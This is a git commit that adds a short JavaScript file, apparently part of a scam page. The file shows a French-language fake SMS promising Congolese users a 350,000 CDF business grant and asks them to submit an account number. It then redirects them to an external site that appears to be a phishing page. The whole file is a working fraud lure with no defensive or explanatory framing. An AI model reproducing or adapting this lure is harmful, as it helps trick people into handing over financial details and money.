b3ca8a6a0620b9cc24a791ceaeb22571dd846bd4
ukebeblog <esther001imoh@gmail.com>
2025-01-02 18:52:24 +0100

    Create drc-grant-active.js

---
+++ drc-grant-active.js
@@ -0,0 +1,6 @@
+
+var password = 'RETIRER 350 000 CDF'
+password=prompt('SMS: Vous faites partie des Congolais sélectionnés pour recevoir une subvention de soutien aux entreprises de 350 000 CDF, veuillez appuyer sur OK pour soumettre le numéro de compte maintenant ','RETIRER 350 000 CDF');
+if (password != 'RETIRER 350 000 CDF') {
+location.href='https://newyr-gift.org/business-grant-drc.html';
+}
